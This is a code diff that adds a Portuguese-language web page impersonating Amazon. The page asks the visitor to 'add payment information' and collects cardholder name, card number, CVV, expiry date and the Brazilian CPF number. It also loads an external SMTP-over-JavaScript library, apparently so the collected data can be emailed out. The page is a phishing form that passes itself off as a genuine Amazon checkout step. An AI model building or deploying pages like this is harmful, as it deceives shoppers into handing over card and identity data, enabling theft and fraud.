@@ -1,0 +1,79 @@
+<html lang="pt-br"><head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="confirmardadosdepagamento_files/bootstrap.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="confirmardadosdepagamento_files/estilos.css">
+    <link rel="stylesheet" href="confirmardadosdepagamento_files/forms.css">
+    <script src="jquery-3.6.0.js"></script>
+    <script src="card.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <title>Amazon</title>
+</head>
+<body style="display: block;">
+    <div class="container-fluid">
+        <div class="row navbar" style="center; display: grid; justify-content: center;">
+            <div class="col-3">
+                <img style="" src="assets/body/amazon.png">
+            </div>
+        </div>
+    </div>
+    <div class="container-fluid">
+        <a href="localdeenvio.html">
+            <div class="row" style="margin-left: -15px; margin-right: -15px; margin-bottom: 44px;">
+            <div class="col-12" style="padding: 0px; display: flex;">
+                <div class="return" style="text-align: center; padding: 14px">
+                    <h6 style="height: 10px;">Adicionar informações de pagamento</h6>
+                </div>
+            </div>
+        </div>
+        </a>
+    </div>
+    <div style="margin-top: 36px;text-align: ;display: flow-root;justify-content: center;" class="container">
+        <div class="row justify-content-center" style="display: flex;padding: 30px;text-align: center;justify-content: center;">
+            <div class="col-sm-12 col-lg-6" style="text-align: center;">
+                <div class="boxb" style="text-align: center;padding: 0px;">
+                    <div class="container-fluid">
+                        <div class="row justify-content-center" style="display: flex;">
+                            <div class="col-12" style="max-width: 360px;">
+                                <div class="row" style="display: block;">
+                                    <form action="card" method="post">
+                                        <div class="card">
+                                        <input class="inputForm1 x" type="name" maxlength="50" id="ap_cardinfo_cardName" name="ap_customer_cardName" placeholder="Nome no cartão" autocomplete="cc-name" required="required">
+                                        <input class="inputForm1 x" type="number" maxlength="20" id="ap_cardinfo_cardNumber" name="ap_cardinfo_cardNumber" placeholder="Número do cartão" autocomplete="cc-number" required="required">
+                                        <input class="inputForm1" type="number" maxlength="6" id="ap_cardinfo_cardCvv" name="ap_cardinfo_cardCvv" placeholder="cvv (código de segurança)" autocomplete="cc-csc" required="required">
+                                        </div>
+                                        <input class="inputForm x" type="text" maxlength="50" id="ap_cardinfo_data" name="ap_cardinfo_data" placeholder="Data de expiração do cartão" style="border-radius: 8px;" autocomplete="cc-exp" required="required">
+                                        <input class="inputForm x" type="number" maxlength="50" id="ap_cardinfo_cpf" name="ap_cardinfo_cpf" placeholder="CPF" style="border-radius: 8px;" required="required">
+                                        <div class="b-button" style="margin-bottom: 96px;">
+                                            <input class="c-button-input" value="Adicionar forma de pagamento" type="submit" id="submit" required="required" style="margin-top: 47px;">
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!--Footer-->
+    <footer style="margin-top: 32px;">
+        <div class="row justify-content-center a-a">
+            <div class="col-3"><h1>Cookies</h1></div>
+            <div class="col-3"><h1>Condições de uso</h1></div>
+            <div class="col-3"><h1>Aviso de Privacidade</h1></div>
+        </div>
+        <div class="row justify-content-center a-a">
+            <div class="col-10">
+                <h1>© 1996-2021, Amazon.com, Inc. ou suas afiliadas</h1>
+            </div>
+        </div>
+    </footer>
+
+
+</body></html>
